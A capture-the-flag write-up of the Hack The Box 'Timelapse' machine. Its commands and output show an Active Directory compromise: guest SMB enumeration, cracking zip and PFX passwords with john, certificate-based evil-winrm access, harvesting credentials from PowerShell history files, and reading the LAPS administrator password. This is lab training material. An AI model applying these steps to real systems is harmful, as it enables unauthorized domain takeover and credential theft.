---
title: "Hack The Box: Timelapse"
date: 2025-11-15
summary: "An Easy Windows-based machine where the target is compromised by extracting a password-protected PFX file from a zip archive in an SMB share, cracking both encryption layers to obtain SSL certificates for WinRM access. Enumerating PowerShell history files exposes cleartext credentials for a service account, which is found to belong to the LAPS_Readers group and allows retrieving the local Administrator password from Active Directory."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/Timelapse"
tags:
  - active-directory
  - credentials-in-powershell-history
  - credentials-in-public-shares
  - evil-winrm
  - john
  - laps
  - laps-readers-group
  - netexec
  - nmap
  - openssl
  - pfx2john
  - smbclient
  - zip2john
---

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.227.113
Nmap scan report for 10.129.227.113
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2025-11-15 10:23:16 +04 for 106s
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-15 10:23:36Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38738/tcp): CLEAN (Timeout)
|   Check 2 (port 56055/tcp): CLEAN (Timeout)
|   Check 3 (port 43455/udp): CLEAN (Timeout)
|   Check 4 (port 4314/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-15T10:24:24
|_  start_date: N/A
|_clock-skew: mean: 4h00m03s, deviation: 0s, median: 4h00m03s
<SNIP>
```

The target is likely a Domain Controller (DC), as seen from the pattern of running services.

### Enumerating SMB

Let’s check if guest authentication with SMB is allowed:

```bash
$ netexec smb 10.129.227.113 -u guest -p ''
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest:
```

Nice, it is. So let’s generate a hosts file to append it to `/etc/hosts`:

```bash
$ netexec smb 10.129.227.113 -u guest -p '' --generate-hosts-file hosts
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest:

$ cat hosts | sudo tee -a /etc/hosts
10.129.227.113     DC01.timelapse.htb timelapse.htb DC01
```

Now let’s see what available shares are there and are readable with guest account:

```bash
$ netexec smb timelapse.htb -u guest -p '' --shares
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest:
SMB         10.129.227.113  445    DC01             [*] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share
SMB         10.129.227.113  445    DC01             Shares          READ
SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share
```

There is only one interesting readable share, called Shares.

### Cracking PFX Cryptographic File

Let’s browse it using `smbclient` and check its contents:

```bash
$ smbclient -N //timelapse.htb/Shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 19:39:15 2021
  ..                                  D        0  Mon Oct 25 19:39:15 2021
  Dev                                 D        0  Mon Oct 25 23:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 19:48:42 2021
```

There are two directories in it.

As they might hold lots of subdirectories in a recursive manner, I’ll download all files in the share recursively:

```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
<SNIP>
```

```bash
$ tree -a .
.
├── Dev
│   └── winrm_backup.zip
└── HelpDesk
    ├── LAPS_Datasheet.docx
    ├── LAPS_OperationsGuide.docx
    ├── LAPS_TechnicalSpecification.docx
    └── LAPS.x64.msi
```

Let’s try unzipping the ZIP file:

```bash
$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

So it requires a password.

Let’s extract the password’s hash with `zip2john` and attempt cracking it with `john`:

```bash
$ zip2john winrm_backup.zip > zip.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

$ john zip.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
suprem<REDACTED>    (winrm_backup.zip/legacyy_dev_auth.pfx)
<SNIP>
```

Nice, it was successfully cracked.

Now let’s extract the files out of the ZIP file:

```bash
$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: suprem<REDACTED>
  inflating: legacyy_dev_auth.pfx

$ ls
legacyy_dev_auth.pfx  winrm_backup.zip
```

The output is a `.pfx` file, which is an archive of certificates and keys.

### RCE as Legacyy

These certificates and keys can be used to log into `evil-winrm` (indicated by the ZIP file name), so let’s do that.

Let’s first extract the certificate from this file:

```bash
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
Enter Import Password:
```

Interesting, another hash to extract and crack.

Let’s run `pfx2john` and `john` on the file:

```bash
$ pfx2john legacyy_dev_auth.pfx > pfx.hash

$ john pfx.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
thug<REDACTED>       (?)
<SNIP>
```

Nice, another hash cracked successfully!

Now let’s use the extracted password to extract the certificate:

```bash
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
Enter Import Password: thug<REDACTED>

$ ls
cert.pem  legacyy_dev_auth.pfx  winrm_backup.zip
```

And also we will need to extract the key, which will ask for inputting a passphrase after authenticating, so I’ll use `1234`:

```bash
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem

Enter Import Password: thug<REDACTED>
Enter PEM pass phrase: 1234
Verifying - Enter PEM pass phrase: 1234

$ ls
cert.pem  key.pem  legacyy_dev_auth.pfx  winrm_backup.zip
```

Nice. Now we only need the associated username, which can be found in the `cert.pem` file:

```bash
$ cat cert.pem | grep -i subject
subject=CN=Legacyy
```

Perfect.

Now with the username, certificate, key, and passphrase in the arsenal, let’s use them to gain access to the target via `evil-winrm`, where `user.txt` will be awaiting:

```bash
$ evil-winrm -S -i dc01.timelapse.htb -u Legacyy -c cert.pem -k key.pem

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
Enter PEM pass phrase: 1234
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ../
*Evil-WinRM* PS C:\Users\legacyy> cd Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls

    Directory: C:\Users\legacyy\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/15/2025   2:15 AM             34 user.txt

*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
20c3c0<REDACTED>
```

### RCE as Svc_deploy

### Identifying Credentials in Powershell History

Typical post-compromise enumeration returned nothing useful about this user initially.

Yet, I checked the contents of Powershell History files for all users in the machine. Luckily, one of them had cleartext credentials in it:

```bash
*Evil-WinRM* PS C:\users\legacyy\Desktop> foreach($user in ((ls C:\\users).fullname)){cat "$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q6<REDACTED>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Let’s check if this user can access some more interesting shares:

```bash
$ netexec smb dc01.timelapse.htb -u svc_deploy -p 'E3R$Q6<REDACTED>' --shares
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q6<REDACTED>
SMB         10.129.227.113  445    DC01             [*] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.227.113  445    DC01             Shares          READ
SMB         10.129.227.113  445    DC01             SYSVOL          READ            Logon server share
```

Nothing too interesting.

Let’s see if the user can `winrm`:

```bash
$ netexec winrm dc01.timelapse.htb -u svc_deploy -p 'E3R$Q6<REDACTED>'
WINRM-SSL   10.129.227.113  5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
WINRM-SSL   10.129.227.113  5986   DC01             [+] timelapse.htb\svc_deploy:E3R$Q6<REDACTED> (Pwn3d!)
```

It can.

Let’s log into `evil-winrm` as this user to look for more interesting findings:

```bash
$ evil-winrm -S -i dc01.timelapse.htb -u svc_deploy -p 'E3R$Q6<REDACTED>'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

Nice.

### RCE as Administrator

### Reading LAPS Password of Local Admin

This time, typical post-compromise enumeration did identify some interesting facts:

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /all

<SNIP>

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

<SNIP>
```

This user is part of the `LAPS_Readers` group, which means that this user can read the LAPS password of the local Administrator account.

Let’s do exactly that:

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : 5Y65[2)<REDACTED>
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

Perfect.

Now with the admin’s password in hand, it is a matter of `evil-winrm` to get the `root.txt` flag:

```bash
$ evil-winrm -S -i timelapse.htb -u Administrator -p '5Y65[2)<REDACTED>'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

So the root flag isn’t in the admin’s desktop, which means that a hide and seek game must be played:

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ../..
*Evil-WinRM* PS C:\Users> tree . /F
Folder PATH listing
Volume serial number is 22CC-AE66
C:\USERS
<SNIP>
ÀÄÄÄTRX
    ÃÄÄÄ3D Objects
    ÃÄÄÄContacts
    ÃÄÄÄDesktop
    ³       root.txt
    ³
<SNIP>
*Evil-WinRM* PS C:\Users> cat TRX/Desktop/root.txt
219a38<REDACTED>
```
